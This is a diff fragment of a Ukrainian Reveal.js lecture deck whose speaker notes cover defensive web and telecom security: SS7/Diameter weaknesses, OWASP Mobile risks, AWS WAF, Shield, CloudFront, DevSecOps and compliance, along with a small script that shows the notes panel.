+            <p>Ініціатива <strong>CAMARA</strong> (Linux Foundation + GSMA) стандартизує відкриті телеком API. Кожен API несе власні ризики безпеки: <strong>SIM Swap API</strong> є критичним — банки використовують його для перевірки перед надсиланням SMS OTP; компрометація цього API дозволяє обходити двофакторну аутентифікацію. <strong>Device Location API</strong> є ризиком приватності: несанкціонований доступ перетворює його на інструмент стеження. <strong>Number Verification API</strong> може використовуватися для масового збору номерів телефонів.</p>
+            <p>Безпека CAMARA API вимагає повного стека захисту: <strong>OAuth 2.0 + PKCE</strong> як стандарт аутентифікації для третіх сторін; <strong>OIDC</strong> для верифікації особи абонента (network-based auth — оператор підтверджує, що запит надходить з мережі відповідного абонента); <strong>Consent Management</strong> — явна згода абонента є обов'язковою для API, що розкривають персональні дані; rate limiting на кожен метод та API-ключ. В AWS типовий стек для розгортання CAMARA API: API Gateway + Cognito + Lambda Authorizer + WAF.</p>`,
+
+            /* Слайд 27 */
+            `<h3>SS7 та Diameter — аналіз вразливостей legacy-сигналізації</h3>
+            <p>SS7 (Signaling System 7), розроблений у 1975 році, є глобальним стандартом міжнародної телекомунікаційної сигналізації. Протокол проектувався для надійності в умовах ядерної війни, але не для безпеки в умовах відкритого доступу до SS7-шлюзів. Ключова проблема: відсутність автентифікації між операторами — будь-який вузол із доступом до SS7-мережі може надсилати команди, і мережа їх виконає. Критичність визначається глобальним характером: компрометація SS7-вузла однієї мережі надає доступ до абонентів будь-якої мережі у світі через ланцюжок роумінгових угод.</p>
+            <p>Атака <strong>Location Tracking</strong> через <code>SendRoutingInfo</code> (SRI) дозволяє визначити базову станцію абонента з точністю 200–500 метрів у містах. <strong>SMS Interception</strong> реалізується через перереєстрацію жертви в підставному VLR через <code>UpdateLocation</code> — всі SMS будуть перенаправлені через підставний вузол. Саме цей механізм робить SMS OTP ненадійним для критичних систем: NIST SP 800-63B вимагає уникати SMS як єдиного фактора MFA для систем AAL2 і вище. Класифікація GSMA FS.11 визначає три категорії захисних заходів: блокування невідомих джерел (Cat 1), обмеження інформаційних запитів (Cat 2), виявлення аномалій через ML (Cat 3).</p>
+            <p><strong>Diameter</strong> (4G LTE) успадкував принципові проблеми SS7 — відсутність кінцевої аутентифікації між операторами. Diameter Firewall є стандартним засобом захисту, що фільтрує команди відповідно до очікуваних патернів. Для операторів, що мігрують на 5G, критично важливо ізолювати 5G-ядро від SS7-інфраструктури — 5G SBA не використовує SS7 для внутрішньої сигналізації, але підтримка SS7-шлюзів для backward compatibility залишається вектором атаки.</p>`,
+
+            /* Слайд 28 */
+            `<h3>Mobile Apps — OWASP Mobile Top 10 та специфіка захисту</h3>
+            <p>OWASP Mobile Top 10 (2024) описує специфічні ризики мобільних застосунків, що частково перетинаються з веб-вразливостями, але мають власну специфіку. <strong>M1 — Improper Credential Usage</strong> є найпоширенішою мобільною вразливістю: API-ключі та паролі у вихідному коді легко витягуються зворотнім інжинірингом APK через <code>apktool</code>, <code>jadx</code> або <code>strings</code>. <strong>M3 — Insecure Auth</strong>: зберігання JWT у незахищеному <code>SharedPreferences</code> (Android) або незашифрованому <code>NSUserDefaults</code> (iOS) дозволяє зловмисникові з фізичним доступом або root-правами витягти токен. <strong>M5 — Insecure Communication</strong>: вимкнена перевірка TLS-сертифіката (<code>trustAllCerts</code>, <code>hostnameVerifier</code> що завжди повертає true) відкриває застосунок для MITM-атак.</p>
+            <p>Захист Android-застосунків базується на кількох механізмах. <strong>Android Keystore</strong> зберігає ключі в Trusted Execution Environment (TEE), унеможливлюючи витік навіть при компрометації ОС. <strong>Network Security Config</strong> дозволяє декларативно налаштувати certificate pinning через XML: при пінінгу зловмисник не може виконати MITM навіть із довіреним сертифікатом у систему. <strong>ProGuard/R8</strong> виконує обфускацію та мінімізацію байт-коду, ускладнюючи зворотній інжиніринг. <strong>Play Integrity API</strong> дозволяє серверу перевірити, чи не є пристрій rooted та чи не модифікований застосунок.</p>
+            <p>На iOS відповідними механізмами є <strong>Secure Enclave</strong> (апаратне зберігання ключів), <strong>Keychain</strong> (захищене сховище credentials із доступом лише для конкретного застосунку), <strong>App Transport Security</strong> (примусове TLS 1.2+). Jailbreak-специфічний ризик iOS: зломаний пристрій може надати зловмисному ПЗ доступ до Keychain та перехоплення мережевого трафіку. Інструменти для аудиту безпеки мобільних застосунків: MobSF (статичний та динамічний аналіз), Frida (динамічна інструментація), objection (автоматизація Frida для типових тестів).</p>`,
+
+            /* Слайд 29 */
+            `<h3>AWS API Gateway — архітектура захисту та механізми авторизації</h3>
+            <p>AWS API Gateway надає три типи API з різними характеристиками. <strong>REST API</strong> є найбільш функціональним: підтримує кешування відповідей, схемну валідацію запитів через Models та Request Validators, усі типи авторизаторів, Stage Variables та Canary deployments. <strong>HTTP API</strong> є легковаговою альтернативою зі зниженою вартістю (~70% економії), але без підтримки WAF-інтеграції на рівні Stage. <strong>WebSocket API</strong> підтримує persistent connections у реальному часі — критично для VoIP-застосунків та чат-систем телекому.</p>
+            <p><strong>Lambda Authorizer</strong> є найбільш гнучким механізмом: кастомна Lambda-функція отримує токен або параметри запиту, виконує будь-яку логіку перевірки та повертає IAM Policy Document. Це дозволяє інтегруватися з legacy AAA-системами телекому, перевіряти власні JWT формати, або реалізувати контекстно-залежну авторизацію (наприклад, обмеження доступу до CDR лише за власним MSISDN). Кешування результатів авторизатора (TTL до 3600 с) суттєво знижує latency та вартість. <strong>mTLS</strong> є стандартом для B2B-інтеграцій: кожен оператор-партнер отримує унікальний клієнтський сертифікат, що забезпечує строгу взаємну аутентифікацію.</p>
+            <p>Захист від зловживань реалізується через: <strong>Throttling</strong> на рівні Stage (10,000 req/s burst + 5,000 req/s steady state за замовчуванням) та на рівні методу (окремі ліміти для критичних endpoint); <strong>Usage Plans</strong> із квотами для різних категорій клієнтів (партнери, внутрішні системи, публічний API); прив'язку <strong>AWS WAF</strong> для фільтрації шкідливих запитів на рівні API Gateway. Моніторинг через CloudWatch: метрики Count, Latency, 4XXError, 5XXError, IntegrationLatency дозволяють виявляти аномалії в реальному часі.</p>`,
+
+            /* Слайд 30 */
+            `<h3>AWS WAF v2 — архітектура, Managed Rules та практика впровадження</h3>
+            <p>AWS WAF v2 організований ієрархічно: <strong>Web ACL</strong> прив'язується до ресурсу (ALB, CloudFront distribution, API Gateway Stage або AppSync GraphQL API); містить упорядковані за пріоритетом <strong>Rule Groups</strong> (логічне групування правил); кожне <strong>Rule</strong> визначає умову (statement) та дію (Allow, Block, Count, CAPTCHA, Challenge). Пріоритет визначає порядок перевірки — правило з нижчим числом перевіряється першим. Перша правило, що спрацювало, визначає дію; наступні правила не перевіряються.</p>
+            <p><strong>AWS Managed Rule Groups</strong> забезпечують готовий захист, що постійно оновлюється AWS: <code>AWSManagedRulesCommonRuleSet</code> захищає від загального OWASP Top 10 (SQLi, XSS, Command Injection, Path Traversal); <code>AWSManagedRulesSQLiRuleSet</code> додає розширені SQL Injection правила; <code>AWSManagedRulesBotControlRuleSet</code> виявляє та блокує ботів за поведінковими сигнатурами; <code>AWSManagedRulesATPRuleSet</code> захищає від Account Takeover — аналізує форми входу на предмет credential stuffing. Рекомендований підхід: спочатку всі правила в режимі Count (2–4 тижні для аналізу false positives), потім поступовий переклад в Block.</p>
+            <p>Кастомні типи правил: <strong>IP set</strong> для блокування/дозволу за конкретними IP або CIDR; <strong>Geo match</strong> для блокування/дозволу за країною; <strong>Rate-based</strong> — автоматичне блокування при перевищенні ліміту (наприклад, 2000 req/5 хв з одного IP); <strong>Regex pattern</strong> для пошуку шкідливих патернів у body, header, URI. WAF логи → Kinesis Data Firehose → S3 → Athena: Athena дозволяє виконувати SQL-запити для аналізу заблокованих запитів та виявлення патернів атак у великих обсягах логів.</p>`,
+
+            /* Слайд 31 */
+            `<h3>AWS Shield — теорія та практика DDoS-захисту</h3>
+            <p><strong>AWS Shield Standard</strong> є базовим рівнем захисту, що автоматично застосовується до всіх AWS-ресурсів без додаткових налаштувань та вартості. Він захищає від найпоширеніших L3/L4 атак: UDP/ICMP flood, SYN flood, DNS reflection. Захист реалізується на рівні AWS-інфраструктури — шкідливий трафік блокується до досягнення ресурсу. Для більшості застосунків Shield Standard у поєднанні із CloudFront є достатнім рівнем захисту від об'ємних атак.</p>
+            <p><strong>AWS Shield Advanced</strong> ($3,000/місяць або в рамках Business Support) додає значно розширені можливості. <strong>DDoS Response Team (SRT)</strong> доступний 24/7 для активного мітигування атак, налаштування custom правил WAF під час інциденту та проактивного контакту. <strong>Cost Protection</strong> є критично важливою особливістю: AWS компенсує вартість auto-scaling (EC2, ALB, CloudFront) що виникла внаслідок DDoS-атаки. <strong>Advanced Metrics</strong> у CloudWatch надають детальну аналітику трафіку та можливість налаштування алертів на специфічні патерни атак. <strong>Proactive Engagement</strong> — AWS сам ініціює контакт із клієнтом при виявленні атаки, не чекаючи його звернення.</p>
+            <p>Ешелонована оборона від DDoS в AWS реалізується послідовністю рівнів: Route 53 з Anycast-маршрутизацією (запит обслуговується найближчим DNS-сервером AWS) → CloudFront (450+ PoP поглинають атакуючий трафік на edge, origin-сервер бачить лише відфільтрований трафік) → Shield Advanced (L3/L4/L7 мітигування) → WAF rate-based rules → ALB (connection draining, timeout конфігурація, health checks). У телекомунікаційному контексті специфічним вектором є SIP INVITE-флуд на SBC та Diameter flood на сигнальні шлюзи.</p>`,
+
+            /* Слайд 32 */
+            `<h3>Amazon CloudFront — CDN як компонент безпекової архітектури</h3>
+            <p>Amazon CloudFront є не просто CDN для прискорення доставки контенту, але й повноцінним компонентом безпекової архітектури. 450+ Points of Presence (PoP) по всьому світу утворюють розподілену інфраструктуру, що поглинає атакуючий трафік на edge — origin-сервер отримує лише відфільтрований трафік. CloudFront забезпечує TLS-термінацію на edge, знімаючи криптографічне навантаження з origin. <strong>Origin Access Control (OAC)</strong> гарантує, що S3-сховища доступні виключно через CloudFront: OAC підписує запити від CloudFront до S3 за допомогою AWS Signature Version 4, що дозволяє S3 Bucket Policy перевірити джерело запиту.</p>
+            <p><strong>Signed URLs та Signed Cookies</strong> забезпечують захист преміум-контенту: доступ до захищеного об'єкта можливий лише за наявності підписаного URL із обмеженим терміном дії (та опціонально обмеженням за IP). RSA-підпис обчислюється за допомогою CloudFront Key Pair — навіть якщо зловмисник отримає підписаний URL, його термін дії обмежений. <strong>Geo-restriction</strong> дозволяє блокувати або дозволяти доступ за країнами на рівні CDN — ефективний інструмент відповідності ліцензійним вимогам або регуляторним обмеженням.</p>
+            <p><strong>CloudFront Functions</strong> (JavaScript, &lt;1 мс виконання) та <strong>Lambda@Edge</strong> (Node.js/Python, 1–5 мс) дозволяють виконувати логіку безпеки на edge: перевірка та редірект заголовків, валідація підписаних токенів, URL-нормалізація для кешування. CF Functions ідеально підходять для легкої логіки (auth header check, URL rewrite), Lambda@Edge — для складнішої (A/B тестування, складна авторизація). Важливо: Lambda@Edge виконується в 13 регіонах, що забезпечує глобальне охоплення з мінімальною затримкою.</p>`,
+
+            /* Слайд 33 */
+            `<h3>DevSecOps Pipeline — інтеграція безпеки в CI/CD</h3>
+            <p>DevSecOps Pipeline є практичною реалізацією концепції Shift-Left Security у виробничому середовищі. Безпека інтегрується в кожен етап: <strong>Source</strong> — branch protection rules (обов'язковий code review, заборона force push на main), signed commits для верифікації авторства. <strong>SAST</strong> — Semgrep або CodeGuru Security виконується на кожен Pull Request, аналізуючи зміни на предмет SQLi, XSS, Command Injection, небезпечних криптографічних примітивів. <strong>SCA</strong> — Snyk або GitHub Dependabot автоматично відкриває PR із оновленнями вразливих залежностей.</p>
+            <p><strong>Build</strong> — CodeBuild виконує збірку контейнерного образу в ізольованому середовищі; buildspec.yml ніколи не повинен містити секретів — всі credentials завантажуються через AWS Secrets Manager або Parameter Store. <strong>Image Scan</strong> — Inspector V2 або Trivy сканують збудований образ на CVE у системних бібліотеках та залежностях; критичні CVE (CVSS ≥ 9.0) автоматично зупиняють pipeline. <strong>DAST</strong> — OWASP ZAP виконується проти staging-середовища, тестуючи живий застосунок на XSS, SQLi, CSRF, Insecure Headers без необхідності доступу до вихідного коду.</p>
+            <p><strong>Security Gates</strong> є ключовим елементом зрілого DevSecOps: жодна критична вразливість не потрапляє у production. Автоматична зупинка pipeline при SAST або DAST знахідках CRITICAL/HIGH (з можливістю security exception з обґрунтуванням та терміном виправлення). <strong>Deploy</strong> — canary deployment дозволяє поступово розгортати нову версію (1% → 10% → 100% трафіку) з автоматичним rollback при деградації метрик. <strong>Production</strong> — GuardDuty + WAF + Security Hub забезпечують безперервний моніторинг після деплою. Весь цикл від коміту до production займає 15–30 хвилин.</p>`,
+
+            /* Слайд 34 */
+            `<h3>Регуляторна відповідність — PCI DSS, GDPR та телеком-стандарти</h3>
+            <p><strong>PCI DSS v4.0</strong> встановлює обов'язкові вимоги для організацій, що обробляють платіжні картки. Ключові вимоги для веб-застосунків: Req 6.4 — WAF є обов'язковим для всіх публічних веб-застосунків, що обробляють CHD (Cardholder Data); Req 6.3.3 — всі програмні компоненти повинні бути захищені від відомих вразливостей через patch management; Req 8.3 — MFA є обов'язковим для всіх не-консольних доступів до середовища CDE (Cardholder Data Environment); Req 10.2 — детальне логування всіх доступів до CHD; Req 11.3 — penetration testing щонайменше раз на рік.</p>
+            <p><strong>GDPR</strong> вимагає Privacy by Design у веб-застосунках: мінімізація даних (збір тільки необхідного), право на видалення (API для безповоротного знищення персональних даних, включаючи backup), право на портабельність (API для експорту даних у машиночитаємому форматі), повідомлення про порушення протягом 72 годин (реалізується через CloudWatch Alarms з автоматичним escalation). <strong>ISO/IEC 27034</strong> визначає Application Security Management Process — формалізований підхід до управління безпекою застосунків на рівні організації.</p>
+            <p>AWS надає комплексні інструменти для відповідності стандартам. <strong>AWS Audit Manager</strong> автоматизує збір доказів відповідності PCI DSS, GDPR, ISO 27001, HIPAA. <strong>AWS Config</strong> відстежує конфігурацію ресурсів і виявляє відхилення від security baseline. <strong>AWS Macie</strong> використовує ML для виявлення PII та PCI DSS-даних у S3. <strong>AWS Artifact</strong> надає SOC 1/2/3 звіти, PCI DSS AOC та ISO 27001-сертифікати для демонстрації відповідності аудиторам клієнтів.</p>`,
+
+            /* Слайд 35 */
+            `<h3>Практичний кейс: захищений телеком-портал у AWS</h3>
+            <p>Розглянемо архітектуру реалістичного Self-Service Portal мільйонного мобільного оператора: перегляд рахунків, деталізованих записів дзвінків (CDR), зміна тарифних планів, управління додатковими послугами. Архітектура реалізує Defense in Depth: Route 53 з GeoDNS (обмеження доступу за країною → зниження ризику атак з інших юрисдикцій) → CloudFront + WAF (OWASP CRS + Bot Control + ATP) → Cognito (MSISDN-based auth + TOTP MFA) → ALB → ECS (React frontend + Node.js API) → API Gateway → Lambda Authorizer → BSS API → RDS Aurora (CDR) + ElastiCache (session).</p>
+            <p>Кожна із задокументованих загроз має конкретний контрзахід. <strong>IDOR/CDR витік</strong>: Lambda Authorizer перевіряє відповідність запитуваного MSISDN ідентифікатору аутентифікованого користувача з Cognito JWT, незалежно від Frontend-логіки. <strong>Account Takeover</strong>: Cognito MFA + WAF ATP Rule Group, що аналізує credential stuffing patterns. <strong>DDoS</strong>: CloudFront + Shield Advanced + WAF rate limiting; Route 53 GeoDNS знижує поверхню атаки. <strong>Toll Fraud</strong>: Lambda rate limiting + GuardDuty anomaly detection для виявлення незвичних API-дзвінків. <strong>CDR витік</strong>: RDS у Private Subnet, шифрування at rest (AES-256), IAM authentication для Lambda→RDS.</p>
+            <p>Особливий аспект: управління секретами реалізується виключно через Secrets Manager з автоматичною ротацією DB credentials кожні 30 днів — Lambda-функція отримує актуальні credentials при кожному виклику. CloudTrail логує всі AWS API-виклики. VPC Flow Logs фіксують мережевий трафік. Security Hub агрегує findings із GuardDuty, Inspector та Macie в єдиний dashboard відповідності. Вся інфраструктура описана Terraform із tfsec-перевіркою у CI/CD.</p>`,
+
+            /* Слайд 36 */
+            `<h3>Типові помилки та хибні уявлення у безпеці веб-застосунків</h3>
+            <p>Практика аудитів безпеки виявляє стійкі антипатерни, що повторюються незалежно від технологічного стеку. <strong>Конкатенація SQL-рядків</strong> замість prepared statements — помилка, яка існує вже 30 років і досі зустрічається у legacy-коді. <strong>Зберігання секретів у Git</strong>: захардкодовані API-ключі потрапляють у публічні репозиторії та миттєво виявляються автоматизованими сканерами (GitGuardian сканує GitHub у реальному часі). <strong>Перевірка прав лише на frontend</strong>: приховування кнопки «Адміністрування» у UI не замінює серверної перевірки авторизації — будь-який HTTP-клієнт може звернутися до endpoint прямо. <strong>Debug режим у production</strong>: stack traces у HTTP-відповідях надають зловмиснику детальну інформацію про внутрішню структуру застосунку.</p>
+            <p>Не менш поширені хибні уявлення. «<strong>WAF захистить від усього</strong>» — WAF не розуміє бізнес-логіку і не може виявити IDOR або Business Logic Bypass; WAF є одним із шарів, а не заміною безпечного коду. «<strong>HTTPS означає безпеку</strong>» — TLS шифрує транспортний канал, але не захищає від XSS, SQLi або IDOR всередині застосунку; зловмисник, що виконує атаку зі скомпрометованого облікового запису, також використовує HTTPS. «<strong>Ми маленькі — нас не атакуватимуть</strong>» — автоматизовані боти сканують весь інтернет незалежно від розміру цілі; 73% атак є opportunistic, а не targeted.</p>
+            <p>«<strong>Firewall закриває порти — нас не зламають</strong>» — L7-атаки через порт 443 є основним вектором; SQL Injection через HTTPS виглядає для firewall як легітимний трафік. «<strong>Ми перевірили security рік тому</strong>» — нові CVE з'являються щодня; новий код вносить нові вразливості; patch management є безперервним процесом. Безпека — це не кінцевий стан, а безперервний процес.</p>`,
+
+            /* Слайд 37 */
+            `<h3>AWS Security Services — зведена порівняльна таблиця</h3>
+            <p>AWS надає комплексний набір сервісів безпеки, що охоплюють різні шари захисту. <strong>AWS WAF</strong> ($5/Web ACL + $1/млн запитів + $1/rule group) захищає L7 від OWASP Top 10 через Managed Rule Groups; кастомні правила дозволяють реалізувати специфічну логіку фільтрації. <strong>Shield Standard</strong> (безкоштовно) автоматично захищає L3/L4 для всіх ресурсів. <strong>Shield Advanced</strong> ($3,000/місяць або в рамках Business Support) додає L7-захист, SRT 24/7 та Cost Protection. <strong>CloudFront</strong> ($0.0085/GB за перші 10 TB) забезпечує CDN + edge security + TLS termination + OAC.</p>
+            <p><strong>Amazon Cognito</strong> (50,000 MAU безкоштовно, потім $0.0055/MAU) надає повний стек Identity: User Pools, MFA, OAuth 2.0, OIDC, SAML, Social login. <strong>AWS Secrets Manager</strong> ($0.40/secret/місяць) забезпечує безпечне зберігання та автоматичну ротацію secrets. <strong>AWS Inspector V2</strong> виконує безперервне scanning EC2 та ECR images на CVE. <strong>Amazon GuardDuty</strong> (ціна залежить від обсягу даних) використовує ML та threat intelligence для виявлення аномалій у CloudTrail, VPC Flow Logs, DNS logs.</p>
+            <p><strong>AWS Security Hub</strong> ($0.001/finding після безкоштовного рівня) агрегує findings із GuardDuty, Inspector, Macie, IAM Access Analyzer та AWS Config, автоматично оцінюючи відповідність CIS AWS Foundations Benchmark, PCI DSS та AWS FSBP. Рекомендований мінімальний стек для production-середовища: AWS WAF + Shield Standard + CloudFront + GuardDuty + Security Hub. Для критичних систем (телеком, платежі) — Shield Advanced + Macie + Audit Manager.</p>`,
+
+            /* Слайд 38 */
+            `<h3>Підсумок лекції: систематизація знань</h3>
+            <p><strong>Частина 1</strong> сформувала фундаментальне розуміння класів вразливостей веб-застосунків. OWASP Top 10 (2021) надає структуровану класифікацію ризиків, де A01 Broken Access Control, A02 Cryptographic Failures та A03 Injection є трьома найпоширенішими категоріями. Кожен клас вразливостей має специфічний механізм атаки та відповідні заходи захисту: параметризовані запити для ін'єкцій, Output Encoding + CSP для XSS, CSRF-токен + SameSite для CSRF, IMDSv2 для SSRF, bcrypt/Argon2id + MFA для Authentication Failures.</p>
+            <p><strong>Частина 2</strong> показала специфіку телекомунікаційного контексту. SIP-протокол є вектором унікальних атак (toll fraud, registration hijacking) що вимагають SBC як захисного бар'єру. Архітектура 5G SBA перетворює ядро мережі на розподілений веб-застосунок зі всіма відповідними ризиками — mTLS та OAuth 2.0 через NRF є обов'язковими вимогами 3GPP TS 33.501. SS7 залишається найслабшою ланкою: NIST SP 800-63B рекомендує уникати SMS OTP через вразливість до SS7-атак.</p>
+            <p><strong>Частина 3</strong> надала практичні інструменти хмарного захисту. AWS WAF Managed Rules захищають від OWASP Top 10 без необхідності написання власних правил. Shield Advanced забезпечує DDoS-захист із фінансовою гарантією (Cost Protection). CloudFront як перший рівень архітектури поглинає атакуючий трафік на edge. DevSecOps Pipeline із Security Gates гарантує, що жодна критична вразливість не потрапляє у production. Регуляторна відповідність (PCI DSS, GDPR, GSMA CLP.13) визначає мінімально прийнятний рівень безпеки для телеком-застосунків.</p>`,
+
+            /* Слайд 39 */
+            `<h3>Лекція 8: Моніторинг, логування та виявлення загроз в AWS</h3>
+            <p>Наступна лекція поглиблює тему безпеки в операційний аспект: від розгортання застосунку до побудови повноцінної системи виявлення загроз та реагування на інциденти. Якщо Лекція 7 розглядала, як запобігти потраплянню атаки до застосунку, то Лекція 8 відповідає на питання: що робити, коли атака вже відбувається або відбулася?</p>
+            <p>Центральна тема — побудова Security Operations Center (SOC) рівня для хмарного телеком-середовища. Amazon GuardDuty застосовує Machine Learning до потоків CloudTrail, VPC Flow Logs та DNS logs для виявлення аномалій: незвична активність IAM credentials, communication з відомими C2-серверами, cryptomining. AWS Security Hub агрегує findings із усіх джерел та автоматично оцінює відповідність CIS та PCI DSS. AWS CloudTrail є незмінним аудит-логом всіх AWS API-дій — критично для forensics та доведення відповідності регуляторам.</p>
+            <p>Лекція 8 також охопить SIEM-інтеграцію (Splunk, Elastic, QRadar з AWS), побудову Incident Response Plan за стандартом NIST SP 800-61, процеси forensics у хмарному середовищі (збереження snapshot'ів, chain of custody), а також практики Threat Hunting — проактивного пошуку прихованих зловмисників у власній інфраструктурі. Ці знання формують повний цикл оперативної безпеки хмарного телеком-застосунку.</p>`,
+        ];
+
+        const notesBtn = document.getElementById('notes-btn');
+        const notesPanel = document.getElementById('notes-panel');
+        const notesCloseBtn = document.getElementById('notes-close-btn');
+        const notesPanelBody = document.getElementById('notes-panel-body');
+
+        function updateNotes() {
+            const idx = Reveal.getState().indexh;
+            notesPanelBody.innerHTML = SLIDE_NOTES[idx] || '<p><em>Нотаток немає</em></p>';
+        }
+
+        notesBtn.addEventListener('click', () => {
+            notesPanel.classList.toggle('open');
+            updateNotes();
+        });
+
+        notesCloseBtn.addEventListener('click', () => {
+            notesPanel.classList.remove('open');
+        });
+
+        Reveal.on('slidechanged', () => {
+            if (notesPanel.classList.contains('open')) {
+                updateNotes();
+            }
         });
     </script>
 </body>
